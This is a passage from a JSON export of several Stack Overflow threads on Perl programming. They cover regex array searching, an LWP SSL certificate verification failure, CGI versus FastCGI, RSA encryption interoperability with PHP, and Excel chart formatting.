"user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1466437167, "post_id": 37926036, "comment_id": 63303616, "body": "You&#39;ll want <code>&#47;i</code> on the match operator for case-insensitive matching."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1466437703, "post_id": 37926036, "comment_id": 63304003, "body": "<code>&#47;\\b(?:merge|changed)\\b&#47;i</code> will prevent <code>submerged</code> from matching"}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": true, "score": 2, "last_activity_date": 1466437491, "last_edit_date": 1466437491, "creation_date": 1466435666, "answer_id": 37926036, "question_id": 37925910, "link": "https://stackoverflow.com/questions/37925910/search-array-of-strings-for-specific-words/37926036#37926036", "title": "Search array of strings for specific words", "body": "<p>The tool for the job here is <code>grep</code> - a function that allows you to specify a filter against a list.  You can use it much like Unix <code>grep</code>, but it'll also allow for more complex tests (e.g. code to run). </p>\n\n<p>In your case:</p>\n\n<pre><code>my @matches = grep { /merge|changed/i } @result; \n\nif ( @matches ) { \n    print \"One or more lines matched\\n\";\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1466437757, "post_id": 37926279, "comment_id": 63304028, "body": "<code>&#47;\\b(?:merge|changed)\\b&#47;i</code> will prevent <code>submerged</code> from matching"}, {"owner": {"reputation": 314, "user_id": 6489035, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0f5660db334824574cadeeaf2a5bbfc2?s=128&d=identicon&r=PG&f=1", "display_name": "R.Dussin", "link": "https://stackoverflow.com/users/6489035/r-dussin"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1466438857, "post_id": 37926279, "comment_id": 63304759, "body": "The slash in the middle -&gt; sure it was a mistake ;)  i&#39;ve tried with the command &#39;ps aux&#39; and the regex /bAsh|apAChe/i And it work great"}], "tags": [], "owner": {"reputation": 314, "user_id": 6489035, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0f5660db334824574cadeeaf2a5bbfc2?s=128&d=identicon&r=PG&f=1", "display_name": "R.Dussin", "link": "https://stackoverflow.com/users/6489035/r-dussin"}, "is_accepted": false, "score": 0, "last_activity_date": 1466437748, "last_edit_date": 1466437748, "creation_date": 1466436406, "answer_id": 37926279, "question_id": 37925910, "link": "https://stackoverflow.com/questions/37925910/search-array-of-strings-for-specific-words/37926279#37926279", "title": "Search array of strings for specific words", "body": "<p>You can do this with a regular expression. In this example if the line match 'merge' or 'changed' (insensitive of course) the line is printed :</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\nmy @result = `command`;\n\nforeach my $line (@result){\n    if ($line =~ /merge|changed/i){\n        print $line;\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 1006, "user_id": 2369597, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/yU383.jpg?s=128&g=1", "display_name": "Wad", "link": "https://stackoverflow.com/users/2369597/wad"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 133, "favorite_count": 0, "accepted_answer_id": 37926036, "answer_count": 2, "score": -1, "last_activity_date": 1466437748, "creation_date": 1466435347, "question_id": 37925910, "link": "https://stackoverflow.com/questions/37925910/search-array-of-strings-for-specific-words", "title": "Search array of strings for specific words", "body": "<p>Firstly, I don't know Perl at all, and need a reasonably quick answer on this.  I have the result of running a command stored in an array:</p>\n\n<pre><code>my @result = `$command`;\n</code></pre>\n\n<p>What I need to do is search the array to see if any element contains the word \"Merge\" or the word \"changed\" (both case insensitive).  </p>\n\n<p>Can someone advise please?</p>\n"}, {"tags": ["linux", "perl", "lwp-useragent"], "comments": [{"owner": {"reputation": 59411, "user_id": 8355, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/8d0099a2574719d7a67eab012851bf9b?s=128&d=identicon&r=PG", "display_name": "cjm", "link": "https://stackoverflow.com/users/8355/cjm"}, "edited": false, "score": 0, "creation_date": 1466441360, "post_id": 37925246, "comment_id": 63306292, "body": "What version of LWP are you using? Version 6 made major changes to SSL support."}, {"owner": {"reputation": 110, "user_id": 3416126, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/ffe8044e84b73d59336ae92e70f9feb1?s=128&d=identicon&r=PG&f=1", "display_name": "user3416126", "link": "https://stackoverflow.com/users/3416126/user3416126"}, "reply_to_user": {"reputation": 59411, "user_id": 8355, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/8d0099a2574719d7a67eab012851bf9b?s=128&d=identicon&r=PG", "display_name": "cjm", "link": "https://stackoverflow.com/users/8355/cjm"}, "edited": false, "score": 0, "creation_date": 1466450028, "post_id": 37925246, "comment_id": 63311005, "body": "perl -MLWP::UserAgent -e &#39;print &quot;$LWP::UserAgent::VERSION\\n&quot;;&#39; 6.05"}, {"owner": {"reputation": 927, "user_id": 5403907, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/F3lnS.jpg?s=128&g=1", "display_name": "mbethke", "link": "https://stackoverflow.com/users/5403907/mbethke"}, "edited": false, "score": 0, "creation_date": 1466612194, "post_id": 37925246, "comment_id": 63392987, "body": "I&#39;m not sure why LWP wouldn&#39;t tell you but it looks like the certificate is not being accepted as a CA. Have you tried adding &quot;-extensions v3_ca&quot; to set the corresponding CA flag when generating the certificate?"}, {"owner": {"reputation": 110, "user_id": 3416126, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/ffe8044e84b73d59336ae92e70f9feb1?s=128&d=identicon&r=PG&f=1", "display_name": "user3416126", "link": "https://stackoverflow.com/users/3416126/user3416126"}, "edited": false, "score": 0, "creation_date": 1467226551, "post_id": 37925246, "comment_id": 63649530, "body": "The SA is looking into the &quot;-extensions v3_ca&quot; and what it does."}], "answers": [{"tags": [], "owner": {"reputation": 110, "user_id": 3416126, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/ffe8044e84b73d59336ae92e70f9feb1?s=128&d=identicon&r=PG&f=1", "display_name": "user3416126", "link": "https://stackoverflow.com/users/3416126/user3416126"}, "is_accepted": false, "score": 1, "last_activity_date": 1467750333, "last_edit_date": 1467750333, "creation_date": 1467749181, "answer_id": 38211835, "question_id": 37925246, "link": "https://stackoverflow.com/questions/37925246/certificate-verify-failed-for-self-signed-on-linux-7-2/38211835#38211835", "title": "Certificate verify failed for self signed on Linux 7.2", "body": "<p>After stracing the perl script it turned out to be sybase.  The sybase client comes with an incompatible version of openssl. Net::SSLeay is an interface to openssl. IO::Socket::SSL uses Net::SSLLeay, LWP::UserAgent uses IO::Socket::SSL.  When the perl script is run, the PATH has sybase directories in the front.  sybase has its own CA files that are not compatible/out of date with the CA RHEL 7 and it reads the sybase CAs first messing everything up by the time it gets to ca.pem.  To fix the problem we changed the perl script to strip out the sybase directories from PATH and then the SSL_ca_file option then works fine.  </p>\n\n<pre><code>my $ua = LWP::UserAgent-&gt;new( ssl_opts =&gt; { verify_hostname =&gt; 1, SSL_ca_file =&gt; '/home/&lt;server account&gt;/certs/ca.pem'});\n</code></pre>\n\n<p>This is the second sybase side effect we have had since going to RHEL 7.  The other one was sybase in increasing file descriptors limits to 4096 vs. the standard 1024 causing a boundary overflow in an array that was hard coded to 1024.</p>\n"}], "owner": {"reputation": 110, "user_id": 3416126, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/ffe8044e84b73d59336ae92e70f9feb1?s=128&d=identicon&r=PG&f=1", "display_name": "user3416126", "link": "https://stackoverflow.com/users/3416126/user3416126"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 995, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1467750333, "creation_date": 1466433385, "question_id": 37925246, "link": "https://stackoverflow.com/questions/37925246/certificate-verify-failed-for-self-signed-on-linux-7-2", "title": "Certificate verify failed for self signed on Linux 7.2", "body": "<p>I have read endless posts on certification error that basically say either turn off validation or fix you certificate.  In our project however we really what to use the certificate, but we can't get it to work.  The SA and 2 programmers have been try everything we can think of and nothing is working.  So clearly we don't know what we are doing.</p>\n\n<p>First, This is the error we get on a simple connection and get perl program. WEBHOSTNAME replace real web hostname.</p>\n\n<pre><code>perl -MIO::Socket::SSL=debug30 testerTut2.pl\nDEBUG: .../IO/Socket/SSL.pm:1784: new ctx 46260896\nDEBUG: .../IO/Socket/SSL.pm:446: socket not yet connected\nDEBUG: .../IO/Socket/SSL.pm:448: socket connected\nDEBUG: .../IO/Socket/SSL.pm:466: ssl handshake not started\nDEBUG: .../IO/Socket/SSL.pm:501: using SNI with hostname WEBHOSTNAME\nDEBUG: .../IO/Socket/SSL.pm:524: set socket to non-blocking to enforce timeout=10\nDEBUG: .../IO/Socket/SSL.pm:537: Net::SSLeay::connect -&gt; -1\nDEBUG: .../IO/Socket/SSL.pm:547: ssl handshake in progress\nDEBUG: .../IO/Socket/SSL.pm:557: waiting for fd to become ready: SSL wants a read first\nDEBUG: .../IO/Socket/SSL.pm:577: socket ready, retrying connect\nDEBUG: .../IO/Socket/SSL.pm:1772: ok=0 cert=46303216\nDEBUG: .../IO/Socket/SSL.pm:537: Net::SSLeay::connect -&gt; -1\nDEBUG: .../IO/Socket/SSL.pm:1408: SSL connect attempt failed with unknown error\n\nDEBUG: .../IO/Socket/SSL.pm:543: fatal SSL error: SSL connect attempt failed with unknown error error:14090086:SSL routines:SSL3_GET_SERVER_CERTIFICATE:certificate verify failed\nDEBUG: .../IO/Socket/SSL.pm:1821: free ctx 46260896 open=46260896\nDEBUG: .../IO/Socket/SSL.pm:1826: free ctx 46260896 callback\nDEBUG: .../IO/Socket/SSL.pm:1829: OK free ctx 46260896\n500 Can't connect to WEBHOSTNAME:443 at testerTut2.pl line 34.\n</code></pre>\n\n<p>This is the perl program:</p>\n\n<pre><code>#!/bin/perl\nrequire LWP::UserAgent;\nuse LWP::Protocol::https;\n\n#note USERNAME is where the real account name goes\nmy $ua = LWP::UserAgent-&gt;new( ssl_opts =&gt; { verify_hostname =&gt; 1, SSL_ca_file =&gt; '/home/USERNAME/ca-bundle.crt'});\n$ua-&gt;timeout(10);\n$ua-&gt;env_proxy;\n\n#note hostname is where the real web host name goes\nmy $response = $ua-&gt;get('https://hostname/tut/ops/data/newtut.dat');\nif ($response-&gt;is_success) \n{\n    print $response-&gt;content;\n    print $response-&gt;decoded_content;  # or whatever\n}\nelse \n{\n    die $response-&gt;status_line;\n}\n</code></pre>\n\n<p>The SA has made a signed certificate on the web server.  Again webhostname would be replaced with real web hostname.</p>\n\n<pre><code>openssl s_client -connect lomweb01:443 -showcerts\nWARNING: can't open config file: /usr/local/ssl/openssl.cnf\nCONNECTED(00000003)\ndepth=0 C = US, ST = MD, L = Greenbelt, O = NASA, OU = MMS, CN = webhostname.edtfmmslinux.ecs.nasa.gov\nverify error:num=18:self signed certificate\nverify return:1\ndepth=0 C = US, ST = MD, L = Greenbelt, O = NASA, OU = MMS, CN = webhostname.edtfmmslinux.ecs.nasa.gov\nverify return:1\n---\nCertificate chain\n 0 s:/C=US/ST=MD/L=Greenbelt/O=NASA/OU=MMS/CN=webhostname .edtfmmslinux.ecs.nasa.gov\n   i:/C=US/ST=MD/L=Greenbelt/O=NASA/OU=MMS/CN=webhostname .edtfmmslinux.ecs.nasa.gov\n-----BEGIN CERTIFICATE-----\nMIIDbDCCAlQC  etc etc k7Pr1nRQG\n3/NKQVqaSITGHGZBtlKjpw==\n-----END CERTIFICATE-----\n---\nServer certificate\nsubject=/C=US/ST=MD/L=Greenbelt/O=NASA/OU=MMS/CN=webhostname .edtfmmslinux.ecs.nasa.gov\nissuer=/C=US/ST=MD/L=Greenbelt/O=NASA/OU=MMS/CN=webhostname .edtfmmslinux.ecs.nasa.gov\n---\nNo client certificate CA names sent\n---\nSSL handshake has read 1639 bytes and written 711 bytes\n---\nNew, TLSv1/SSLv3, Cipher is ECDHE-RSA-AES256-GCM-SHA384\nServer public key is 2048 bit\nSecure Renegotiation IS supported\nCompression: NONE\nExpansion: NONE\nSSL-Session:\n    Protocol  : TLSv1.2\n    Cipher    : ECDHE-RSA-AES256-GCM-SHA384\n    Session-ID: 921941EFFB19FA3158C751D155C012D5A418425BFAE94FEA1D99231A3CEF5D3C\n    Session-ID-ctx:\n    Master-Key: 13BFF7BE2B8ED18056BA54415026FC1ED133F47BADE2683A5EB3A2FED15F34ABD3F837985A498404A948B7F5B1F4774B\n    Key-Arg   : None\n    PSK identity: None\n    PSK identity hint: None\n    SRP username: None\n    TLS session ticket lifetime hint: 300 (seconds)\n    TLS session ticket:\n    0000 - d6 99 6e 28 8c 86 5e 9b-e2 e8  etc. etc.\n    00b0 - 20 96 ea 05 9\n\n    Start Time: 1466432096\n    Timeout   : 300 (sec)\n    Verify return code: 18 (self signed certificate)\n---\n</code></pre>\n\n<p>On the client box I created a local ca-bundle.crt file in the USERNAME home directory.  I \"cp /etc/pki/tls/certs/WEBSERVER.crt ~/ca-bundle.crt\" and had the perl script set the SSL_ca_file value to its path.</p>\n\n<p>The Apache configuration file was update to use the /etc/pki/tls/cert/WEBSERVER.crt file and restarted.</p>\n\n<p>And it still doesn't work.  We have tried different web host name patterns but there is no change.  We have no idea why the certificate is not working, but we think we are following the instructions correctly.   Firefox is happy after we accept the certificate but perl is not.   So what are we doing wrong?</p>\n"}, {"tags": ["perl", "cgi"], "comments": [{"owner": {"reputation": 69, "user_id": 5783418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/809ef3d102efe5f275225d574ff3b1ee?s=128&d=identicon&r=PG&f=1", "display_name": "Bharat", "link": "https://stackoverflow.com/users/5783418/bharat"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1466429172, "post_id": 37923665, "comment_id": 63297846, "body": "@simbabque i have corrected it . Thats just sample code, sorry cant post real code due to security reasons."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1466441320, "post_id": 37923665, "comment_id": 63306260, "body": "You did post real code, despite your claims that you can&#39;t. You should have tested it to make sure it does what you say it does. Now we&#39;re left wondering if you left out the call to <code>$fcgi_request-&gt;Accept</code> on purpose."}], "answers": [{"tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": false, "score": 1, "last_activity_date": 1466430222, "creation_date": 1466430222, "answer_id": 37924147, "question_id": 37923665, "link": "https://stackoverflow.com/questions/37923665/difference-between-cgi-and-fcgirequest-in-perl/37924147#37924147", "title": "difference between cgi and FCGI::Request in perl", "body": "<p><strong>Disclaimer</strong>: This is mostly speculation.</p>\n\n<p>It's likely that whoever implemented that code tried migrating an existing CGI application to FCGI to make it faster. If you look at the <a href=\"https://metacpan.org/pod/FCGI\" rel=\"nofollow\">FCGI</a> documentation you'll see that almost all the parameters that are passed to <code>FCGI::Request</code> are the default values anyway. The only not-default one is this (indentation mine, and actually <a href=\"https://metacpan.org/source/ETHER/FCGI-0.78/FCGI.pm#L14\" rel=\"nofollow\">in the code it's different</a>). </p>\n\n<blockquote>\n  <p>flags (default: 0)<br>\n  Possible values:<br>\n  <strong>FCGI::FAIL_ACCEPT_ON_INTR</strong><br>\n  If set, Accept will fail if interrupted. It\n  not set, it will just keep on waiting.</p>\n</blockquote>\n\n<p>Because those parameters are positional, the author of your code most likely thought it's a good idea to pass in all the defaults so not to change anything. That makes sense, but looks strange.</p>\n\n<p>Then there is the loop in which the program accepts requests. Inside, there is the old CGI program. This program might use other features of CGI like HTML-generation (which is now discouraged), so the author probably left it in. Because of how CGI works (it reads environment variables) and the way FCGI works (also reads environment variables) that's not mutually exclusive.</p>\n\n<p>Now if somewhere down in the program it says stuff like <code>print $q-&gt;header('text/html')</code> then that will go to <code>STDOUT</code>, which above was set as the filehandle that the FCGI request uses. So the FCGI handler will see the output, and all is well.</p>\n\n<p>Now interesting is why there is a <code>while (1)</code> and not a <code>while (my $fcgi_request-&gt;Accept() &gt;= 0  )</code>. It says that the <code>Accept</code> accepts a connection and attaches the handles. This should be in your code somewhere in the loop.</p>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 1, "last_activity_date": 1466441448, "last_edit_date": 1466441448, "creation_date": 1466440974, "answer_id": 37927716, "question_id": 37923665, "link": "https://stackoverflow.com/questions/37923665/difference-between-cgi-and-fcgirequest-in-perl/37927716#37927716", "title": "difference between cgi and FCGI::Request in perl", "body": "<p>CGI is a protocol for passing an HTTP request to a process using a combination of environment variables and STDIN, and to receive a response using STDOUT. As such, the request can only be sent to a child created specifically to handle that request.</p>\n\n<p>Launching a child for each request can be slow, especially if the program needs to be compiled before being executed. Fast CGI is a solution to this problem.</p>\n\n<p>Fast CGI is is a protocol for passing an HTTP request to a process using a socket. As such, the request can be sent to a pre-existing process, and this process can handle multiple requests.</p>\n\n<p>FCGI::Request accepts a Fast CGI request, and makes it look like a CGI request, allowing CGI.pm to be used. This allows familiar libraries to be used, and it allows CGI programs to be converted to Fast CGI programs with more ease.</p>\n\n<hr>\n\n<p>In that particular snippet, FCGI::Request isn't actually used since <code>$request-&gt;Accept()</code> isn't being called. As written, it expects a CGI request, not a Fast CGI request.</p>\n"}], "owner": {"reputation": 69, "user_id": 5783418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/809ef3d102efe5f275225d574ff3b1ee?s=128&d=identicon&r=PG&f=1", "display_name": "Bharat", "link": "https://stackoverflow.com/users/5783418/bharat"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 112, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1466441448, "creation_date": 1466428778, "last_edit_date": 1466429119, "question_id": 37923665, "link": "https://stackoverflow.com/questions/37923665/difference-between-cgi-and-fcgirequest-in-perl", "title": "difference between cgi and FCGI::Request in perl", "body": "<p>I have a peice of code </p>\n\n<pre><code>my $fcgi_request = FCGI::Request(\\*STDIN,\\*STDOUT,\\*STDERR,  \\%ENV,0,FCGI::FAIL_ACCEPT_ON_INTR);\n\nwhile (1) {\n    my $cgi = new CGI('');\n}\n</code></pre>\n\n<p>So what is the role of FCGI::Request and how it is different from CGI because new CGI() is also giving me request handle.</p>\n"}, {"tags": ["php", "perl"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466421030, "post_id": 37920143, "comment_id": 63292358, "body": "This looks familiar somehow. I think I&#39;ve seen a similar question."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 3, "creation_date": 1466421127, "post_id": 37920143, "comment_id": 63292421, "body": "Please show the PHP code you are using as well. You can <a href=\"https://stackoverflow.com/posts/37920143/edit\">edit</a> your question. For this kind of thing, we need a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 31, "user_id": 6488292, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cac55fc76a4ee7203e97a6cdd5e71788?s=128&d=identicon&r=PG&f=1", "display_name": "Amy Kuo", "link": "https://stackoverflow.com/users/6488292/amy-kuo"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466493887, "post_id": 37920143, "comment_id": 63325330, "body": "I solved the problem with add <code>$public-&gt;use_sslv23_padding();</code>"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466495054, "post_id": 37920143, "comment_id": 63326003, "body": "You should post that as an answer with a bit of explanation for future readers."}], "answers": [{"tags": [], "owner": {"reputation": 31, "user_id": 6488292, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cac55fc76a4ee7203e97a6cdd5e71788?s=128&d=identicon&r=PG&f=1", "display_name": "Amy Kuo", "link": "https://stackoverflow.com/users/6488292/amy-kuo"}, "is_accepted": false, "score": 0, "last_activity_date": 1466581237, "creation_date": 1466581237, "answer_id": 37961559, "question_id": 37920143, "link": "https://stackoverflow.com/questions/37920143/is-it-possible-to-encrypt-data-in-perl-using-cryptopensslrsa-and-decrypt-dat/37961559#37961559", "title": "Is it possible to encrypt data in perl using Crypt::OpenSSL::RSA and decrypt data in php?", "body": "<p>solved the problem with add $public->use_sslv23_padding();\nthe encrypt data can decrypt in php.</p>\n"}], "owner": {"reputation": 31, "user_id": 6488292, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cac55fc76a4ee7203e97a6cdd5e71788?s=128&d=identicon&r=PG&f=1", "display_name": "Amy Kuo", "link": "https://stackoverflow.com/users/6488292/amy-kuo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 446, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1466581237, "creation_date": 1466418409, "last_edit_date": 1466475911, "question_id": 37920143, "link": "https://stackoverflow.com/questions/37920143/is-it-possible-to-encrypt-data-in-perl-using-cryptopensslrsa-and-decrypt-dat", "title": "Is it possible to encrypt data in perl using Crypt::OpenSSL::RSA and decrypt data in php?", "body": "<p>I try to encrypt data in perl and decrypt data in php using Crypt::OpenSSL:RSA. \nI am able to decrypt in perl but get NULL in php.</p>\n\n<p>perl code:</p>\n\n<pre><code>use strict;\nuse MIME::Base64;\nuse Crypt::OpenSSL::RSA;\n\nprint \"Content-Type: text/html\\n\\n\";\n\nmy $string = '123';\n\nmy $key_string = \"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2n9QlRt3ERZXt6CQ5ufb\neKIlzaJFqr7LxgxiRSy/ZdMnxvCdRoKtW4JbVM62WaEBuOVZIxlJRYRTplloDl9l\n7yksxEfN5/AosIJzOPqjj1U1ICvoFS1ORS/8FwAqBd3HeL8BW3gIH+03WTh+bKE/\n65u7hyTEi/bb3k1JtxUVSKI04EovCZVivR/nhAZ7lJrjhW23vmhTwlIoIijZfOre\nctE00rcJ9I5KY4V4djQM8mDGFWQTNrdBku+DpGt4//lw/i5w0/MCr9mHqSw3Nxty\n/PnMG7dpiA+WjVA9W1TYCVcRZBD+Wsd3OjXxgl46OZYdI5dKYNLKE7BUMccEJj9l\neQIDAQAB\n-----END PUBLIC KEY-----\";\n\nmy $public = Crypt::OpenSSL::RSA-&gt;new_public_key($key_string);\n$string = $public-&gt;encrypt($string);\n\n$string = MIME::Base64::encode_base64($string);\n\nprint $string;\n</code></pre>\n\n<p>php code:</p>\n\n<pre><code>&lt;?php\n    $encrypted = 'ZkEVc2US6/mqeix3409VYXSTmJtycVLxXztsKpCFpbb6Adp3MBRfYL4nblsWLND+17xaLhVqk4+h ZPw97gzAqlp8YNPA4vgCVdzamq84+kVd7Ykqot9UcDq9zRSpo7S/8EenZO8Cu9OlAwvTavb2pSnX z0w9a9mJqmIJ+zYtao6L1tV3+WlcMIYix9vaIiWU5qZigjNAlff+wT20pEh7Lqu2iAsd1h8aKt5l 3NBRqHG9M0WqTdhzrqk0Rvb9i/a2Zoo7XWC/jz9OR8FaThCM7Gyw8+jWL+z+aL2qveeAPW9e7Pwa GSk1SibTs1L0lTeQk8FmjtC2IW1j7Qn8NzUcZA==';\n    $encrypted = base64_decode($encrypted);\n    $key_content = \"-----BEGIN RSA PRIVATE KEY-----\n\n-----END RSA PRIVATE KEY-----\";\n    $private_key_res = openssl_get_privatekey($key_content);\n    openssl_private_decrypt($encrypted, $decrypted, $private_key_res);\n    var_dump($decrypted);\n?&gt;\n</code></pre>\n\n<p>And I get NULL in PHP</p>\n"}, {"tags": ["perl", "xlsx"], "comments": [{"owner": {"reputation": 7445, "user_id": 1529709, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/3tKqC.jpg?s=128&g=1", "display_name": "zb226", "link": "https://stackoverflow.com/users/1529709/zb226"}, "edited": false, "score": 0, "creation_date": 1466412507, "post_id": 37917767, "comment_id": 63287207, "body": "What module do you use? I can&#39;t find one named &quot;xlswriter&quot; on CPAN."}, {"owner": {"reputation": 95, "user_id": 242617, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2939473167144b7a0a59cdf330105134?s=128&d=identicon&r=PG", "display_name": "tsoomo", "link": "https://stackoverflow.com/users/242617/tsoomo"}, "reply_to_user": {"reputation": 7445, "user_id": 1529709, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/3tKqC.jpg?s=128&g=1", "display_name": "zb226", "link": "https://stackoverflow.com/users/1529709/zb226"}, "edited": false, "score": 0, "creation_date": 1466412897, "post_id": 37917767, "comment_id": 63287448, "body": "I am using <a href=\"http://search.cpan.org/~jmcnamara/Excel-Writer-XLSX/lib/Excel/Writer/XLSX/Chart.pm\" rel=\"nofollow noreferrer\">this</a> one."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466414832, "post_id": 37917767, "comment_id": 63288611, "body": "I found a way and updated the answer."}, {"owner": {"reputation": 95, "user_id": 242617, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2939473167144b7a0a59cdf330105134?s=128&d=identicon&r=PG", "display_name": "tsoomo", "link": "https://stackoverflow.com/users/242617/tsoomo"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466436368, "post_id": 37917767, "comment_id": 63303051, "body": "@simbabque Thank you for your answer. I guessed it.My only problem was can&#39;t set chart series name&#39;s font. I read <a href=\"http://search.cpan.org/~jmcnamara/Excel-Writer-XLSX/lib/Excel/Writer/XLSX/Chart.pm\" rel=\"nofollow noreferrer\">document</a> many times but it seems there is no method for set font for series name."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466436434, "post_id": 37917767, "comment_id": 63303100, "body": "There might not be. You can ask a new question for that and tag it appropriately. We now know that the author frequents SO, so he will probably answer it."}], "answers": [{"comments": [{"owner": {"reputation": 28655, "user_id": 10238, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b8c3b1025babebf20168dd90ea8f268c?s=128&d=identicon&r=PG", "display_name": "jmcnamara", "link": "https://stackoverflow.com/users/10238/jmcnamara"}, "edited": false, "score": 2, "creation_date": 1466423510, "post_id": 37918617, "comment_id": 63293812, "body": "<i>Yes, but it&#39;s hidden. You can set the property xf_index to 0 when creating a Format object.</i> This 